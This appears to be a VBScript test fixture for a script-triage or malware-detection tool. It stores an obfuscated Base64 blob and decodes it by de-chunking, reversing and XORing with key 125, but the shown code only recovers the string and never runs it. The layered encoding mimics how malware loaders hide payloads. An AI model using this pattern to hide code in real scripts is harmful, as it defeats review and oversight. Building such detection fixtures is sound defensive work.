Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_a1c55433 = "CRwZU05PHB9NHExPHEpQGBocCQ4hHxwxDg4YDwkTCDUhHhQRHwgtIQ4PGA4oIUc+QBUJHA0iGBEUGwFOTxwfTRxMTxxKUh8cMQ4OGA8JEwg1QAkTGBocIg8YDggBCRwZU05LTUxOThtMUhkUERwLExRTGBENEBwFGFNOTxwfTRxMTxxKUlJHDg0JCRVAEQ8IAU5PHB9NHExPHEpQExoUHA0QHB5AGRQiExoUHA0QHB4BT0AJEwgSHiIYGhwJDgFNU0tTLSkpNTEwJVNPMTAlLjBADxgJDRwZHAEYERQbIhgJFA8KURgJEhAYDyIYDxQIDB4cQA4NGAkOAUxACw=="
Const Codec_a1c55433 = "base64_chunks|reverse_then_xor|7d"

Function Base64_a1c55433(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_a1c55433", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_a1c55433 = outputBytes
End Function

Function Load_a1c55433()
  Dim partWidth, packedText
  partWidth = (Len(Material_a1c55433) + 3) \ 4
  packedText = Mid(Material_a1c55433, 1, partWidth) & Mid(Material_a1c55433, partWidth + 1, partWidth) & Mid(Material_a1c55433, partWidth * 2 + 1, partWidth) & Mid(Material_a1c55433, partWidth * 3 + 1)
  Load_a1c55433 = Base64_a1c55433(packedText)
End Function

Function Decode_a1c55433(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(UBound(item1) - item5) = item1(item5) Xor 125
  Next
  Decode_a1c55433 = result
End Function

Function Recover_a1c55433()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  item4 = UBound(Array(3, 5, 8, 13))

  item1 = Load_a1c55433()

  For item6 = 0 To 0

    item2 = Decode_a1c55433(item1)

  Next

  item3 = ""

  For item5 = 0 To UBound(item2)

    item3 = item3 & Chr(item2(item5))

  Next
  Recover_a1c55433 = item3
End Function

Function Inspect_a1c55433()
  Dim fields
  fields = Split(Recover_a1c55433(), "|")
  Inspect_a1c55433 = Join(fields, "|")
End Function
